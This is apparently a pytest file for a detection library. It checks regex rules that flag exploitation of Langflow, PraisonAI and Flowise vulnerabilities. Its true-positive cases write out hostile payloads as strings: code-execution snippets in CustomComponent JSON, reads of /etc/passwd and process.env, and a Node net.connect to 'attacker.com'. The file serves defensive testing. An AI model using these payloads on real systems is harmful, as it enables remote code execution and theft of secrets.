"""Tests for incident-postmortem-derived detection patterns (cycle 9, pass 3).

Covers:
- sc_langflow_build_exec  (Langflow CVE-2026-33017, CVSS 9.3)
- sc_ai_framework_auth_disabled  (PraisonAI CVE-2026-44338, CVSS 7.3)
"""

from aigis.filters.patterns import SUPPLY_CHAIN_PATTERNS


def _get_supply(rule_id: str):
    for p in SUPPLY_CHAIN_PATTERNS:
        if p.id == rule_id:
            return p
    raise KeyError(f"Pattern {rule_id!r} not found in SUPPLY_CHAIN_PATTERNS")


# ---------------------------------------------------------------------------
# sc_langflow_build_exec — CVE-2026-33017
# ---------------------------------------------------------------------------


class TestLangflowBuildExec:
    def setup_method(self):
        self.pat = _get_supply("sc_langflow_build_exec")

    # True positives — unauthenticated build endpoint path
    def test_build_public_tmp_full_path(self):
        assert self.pat.pattern.search("POST /api/v1/build_public_tmp/abc123def/flow with payload")

    def test_build_public_tmp_short_path(self):
        assert self.pat.pattern.search("curl http://target/api/v1/build_public_tmp/myflowid/flow")

    def test_build_public_tmp_without_prefix(self):
        assert self.pat.pattern.search(
            "send request to build_public_tmp/langflow-uuid-here/flow endpoint"
        )

    # True positives — CustomComponent with malicious Python code
    def test_custom_component_import_os(self):
        payload = '{"type": "CustomComponent", "code": "import os; os.system(\'id\')"}'
        assert self.pat.pattern.search(payload)

    def test_custom_component_exec(self):
        payload = (
            '"type": "CustomComponent", "data": {"code": "exec(open(\'/etc/passwd\').read())"},'
        )
        assert self.pat.pattern.search(payload)

    def test_custom_component_subprocess(self):
        payload = '"type": "CustomComponent", "label": "shell", "code": "import subprocess; subprocess.run([\'id\'])"'
        assert self.pat.pattern.search(payload)

    def test_custom_component_dunder_import(self):
        payload = (
            '"type": "CustomComponent", "code": "__import__(\'os\').system(\'cat /etc/passwd\')"'
        )
        assert self.pat.pattern.search(payload)

    # True negatives — legitimate content
    def test_build_endpoint_too_short_id(self):
        # ID shorter than 5 chars — not a real flow ID
        assert not self.pat.pattern.search("build_public_tmp/ab/flow")

    def test_custom_component_no_code(self):
        # CustomComponent without any dangerous code
        assert not self.pat.pattern.search(
            '"type": "CustomComponent", "label": "MyComponent", "description": "processes text"'
        )

    def test_legitimate_build_docs(self):
        # Documentation mentioning build but no dangerous patterns
        assert not self.pat.pattern.search(
            "Run `npm run build` in the public/ directory to generate static files."
        )

    def test_langflow_upgrade_advice(self):
        # Remediation advice — should not trigger
        assert not self.pat.pattern.search(
            "Upgrade Langflow to version 1.9.0 to fix CVE-2026-33017 unauthenticated RCE."
        )


# ---------------------------------------------------------------------------
# sc_ai_framework_auth_disabled — CVE-2026-44338
# ---------------------------------------------------------------------------


class TestAiFrameworkAuthDisabled:
    def setup_method(self):
        self.pat = _get_supply("sc_ai_framework_auth_disabled")

    # True positives — hardcoded auth-disabled patterns
    def test_auth_enabled_false(self):
        assert self.pat.pattern.search("AUTH_ENABLED = False")

    def test_auth_enabled_false_spaces(self):
        assert self.pat.pattern.search("AUTH_ENABLED  =  False  # legacy default")

    def test_auth_token_none(self):
        assert self.pat.pattern.search("AUTH_TOKEN = None")

    def test_disable_auth_true(self):
        assert self.pat.pattern.search("DISABLE_AUTH = True")

    def test_verify_token_false(self):
        assert self.pat.pattern.search("verify_token = False")

    def test_verify_token_none(self):
        assert self.pat.pattern.search("verify_token = None")

    def test_authentication_required_false(self):
        assert self.pat.pattern.search("authentication_required = False")

    def test_praisonai_cve_exact_pattern(self):
        code = "class APIServer:\n    AUTH_ENABLED = False\n    AUTH_TOKEN = None\n"
        assert self.pat.pattern.search(code)

    # True negatives — legitimate content
    def test_auth_enabled_true(self):
        assert not self.pat.pattern.search("AUTH_ENABLED = True")

    def test_disable_auth_false(self):
        assert not self.pat.pattern.search("DISABLE_AUTH = False")

    def test_verify_token_true(self):
        assert not self.pat.pattern.search("verify_token = True")

    def test_auth_documentation_prose(self):
        # Prose explanation should not trigger
        assert not self.pat.pattern.search(
            "Set AUTH_ENABLED to True in production to protect endpoints."
        )

    def test_auth_token_set_value(self):
        # Token set to a real string — not disabled
        assert not self.pat.pattern.search('AUTH_TOKEN = "my-secret-token-abc123"')


# ---------------------------------------------------------------------------
# sc_flowise_js_rce — CVE-2025-59528 (added in v1.1.6, salvaged from closed PR #62)
# ---------------------------------------------------------------------------


class TestFlowiseJsRce:
    def setup_method(self):
        self.pat = _get_supply("sc_flowise_js_rce")

    # True positives — Function() constructor with dangerous Node.js modules
    def test_new_function_child_process_detected(self):
        payload = 'new Function(\'return require("child_process").execSync("id")\')() '
        assert self.pat.pattern.search(payload)

    def test_new_function_execsync_detected(self):
        assert self.pat.pattern.search("new Function('code', 'return execSync(cmd)')() ")

    def test_new_function_spawnsync_detected(self):
        assert self.pat.pattern.search('new Function(\'return spawnSync("ls", ["-la"])\')()')

    def test_new_function_fs_module_detected(self):
        assert self.pat.pattern.search(
            'new Function(\'return require("fs").readFileSync("/etc/passwd")\')() '
        )

    def test_new_function_process_env_detected(self):
        assert self.pat.pattern.search("new Function('return JSON.stringify(process.env)')()")

    def test_new_function_net_module_detected(self):
        assert self.pat.pattern.search(
            'new Function(\'return require("net").connect(4444,"attacker.com")\')() '
        )

    def test_function_prototype_constructor_detected(self):
        assert self.pat.pattern.search(
            "[].constructor.constructor('return process.env')()"
        ) or self.pat.pattern.search("Function.prototype.constructor('alert(1)')")

    # True positives — dangerous pattern inside mcpServerConfig field
    def test_mcp_server_config_eval_detected(self):
        payload = 'mcpServerConfig: "eval(userInput)"'
        assert self.pat.pattern.search(payload)

    def test_mcp_server_config_new_function_detected(self):
        payload = 'mcpServerConfig: "new Function(code)()"'
        assert self.pat.pattern.search(payload)

    def test_mcp_command_child_process_detected(self):
        payload = "\"command\": \"require('child_process').exec('id')\""
        assert self.pat.pattern.search(payload)

    # True negatives — legitimate mentions that should NOT fire
    def test_discussion_of_function_constructor_benign(self):
        assert not self.pat.pattern.search(
            "The Function() constructor is a JavaScript built-in that creates function objects."
        )

    def test_json5_parse_benign(self):
        assert not self.pat.pattern.search(
            "The fix replaced Function() with JSON5.parse() to safely parse config."
        )

    def test_safe_new_function_no_modules_benign(self):
        assert not self.pat.pattern.search("new Function('x', 'return x + 1')(5)")

    def test_require_in_prose_benign(self):
        assert not self.pat.pattern.search(
            "You can require the child_process module in Node.js for OS commands."
        )
